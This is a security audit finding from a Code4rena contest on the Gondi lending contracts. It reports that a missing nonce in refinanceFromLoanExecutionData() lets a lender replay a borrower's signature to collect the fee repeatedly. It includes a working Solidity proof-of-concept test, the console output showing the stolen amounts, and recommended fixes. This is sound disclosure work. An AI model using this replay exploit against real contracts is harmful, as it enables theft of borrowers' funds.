# [H] refinanceFromLoanExecutionData() Reusing borrower's signature to steal funds

## Summary
Severity: High
Chain: Smart contract
Component: 2024-05-gondi-mitigation
Published: 2024-05-20
Source: https://github.com/code-423n4/2024-05-gondi-mitigation-findings/issues/39
Type: code-finding

## Details
# Lines of code

https://github.com/pixeldaogg/florida-contracts/blob/b83b37bbe69325b12e3b8119dfd86eb86f16fc73/src/lib/loans/MultiSourceLoan.sol#L320


# Vulnerability details

## Vulnerability details
in `refinanceFromLoanExecutionData()`

The `LoanExecutionData` signature of `borrower` is reusable (since there are no nonces, as long as it doesn't expire)

Suppose `loanOffer.fee =100`.
Then each time `refinanceFromLoanExecutionData()` is executed the funds flow as follows.
1. lender pay = loanOffer.principalAmount - loanOffer.fee
2. borrower repay = loanOffer.principalAmount

So for each execution, `lender` receives a `loanOffer.fee` difference.

( loanOffer.principalAmount - (loanOffer.principalAmount - loanOffer.fee))

This way a malicious `lender` can monitor `emitLoan()` to reuse the signature of the `borrower` to steal funds
Example.
1. bob signs a borrower's `LoanExecutionData` and executes `emitLoan()`. loan : {fee = 1% , lender = alice}
2. Malicious user alice executes `refinanceFromLoanExecutionData(loan)` after `bob`'s transaction, using the signature that `bob` just signed.
3. every time `refinanceFromLoanExecutionData(loan)` is executed, alice gets an extra `fee = 1%`.

## POC
The following code demonstrates the reuse of the `emitLoan()` signature to steal funds.

add to MultiSourceLoan.t.sol
```solidity
    function testReuseBorrowSign() public {
        uint256 privateKey = 100;
        address otherBorrower = vm.addr(privateKey);
        uint256 otherToken = collateralTokenId + 1;

        IMultiSourceLoan.LoanOffer memory loanOffer =
            _getSampleOffer(address(collateralCollection), otherToken, _INITIAL_PRINCIPAL);
        //@info capacity can't 0
        loanOffer.capacity = 1000000e18;
        //@info need fees 1 %
        loanOffer.fee = _INITIAL_PRINCIPAL / 100;         
        testToken.mint(loanOffer.lender, _INITIAL_PRINCIPAL * 10000);
        testToken.mint(otherBorrower, _INITIAL_PRINCIPAL * 10000);
        vm.prank(otherBorrower);
        testToken.approve(address(_msLoan), type(uint256).max);

        collateralCollection.mint(otherBorrower, otherToken);
        vm.prank(otherBorrower);
        collateralCollection.approve(address(_msLoan), otherToken);
        loanOffer.nftCollateralTokenId = otherToken;

        loanOffer.duration = 30 days;
        IMultiSourceLoan.LoanExecutionData memory lde = _sampleLoanExecutionData(loanOffer);
        lde.executionData.tokenId = otherToken;
        lde.borrower = otherBorrower;
        bytes32 executionDataHash = _msLoan.DOMAIN_SEPARATOR().toTypedDataHash(lde.executionData.hash());
        (uint8 vOffer, bytes32 rOffer, bytes32 sOffer) = vm.sign(privateKey, executionDataHash);
        lde.borrowerOfferSignature = abi.encodePacked(rOffer, sOffer, vOffer);
        //@info first loan
        (uint256 loanId, IMultiSourceLoan.Loan memory loan) = _msLoan.emitLoan(lde);

        //@info ********* reuse sign *********
        uint256 initBalance = testToken.balanceOf(loanOffer.lender);
        for(uint i = 0; i < 10; i++) {
            (loanId, loan) =
                _msLoan.refinanceFromLoanExecutionData(loanId, loan, lde);  
            console.log("lender balance increased:", testToken.balanceOf(loanOffer.lender) - initBalance);
               
        }
        //@info ********* reuse sign end *********
    }    
```

```console
$ forge test -vvv --match-test testReuseBorrowSign

[PASS] testReuseBorrowSign() (gas: 952628)
Logs:
  lender balance increased: 1000000
  lender balance increased: 2000000
  lender balance increased: 3000000
  lender balance increased: 4000000
  lender balance increased: 5000000
  lender balance increased: 6000000
  lender balance increased: 7000000
  lender balance increased: 8000000
  lender balance increased: 9000000
  lender balance increased: 10000000
```

## Impact
Reusing `LoanExecutionData` signature to steal funds

## Recommended Mitigation
Recommend that all signatures in the protocol require `nonces` (requires major changes)

Or 

`refinanceFromLoanExecutionData()` can only be executed by `borrower` itself.


## Assessed type

Context
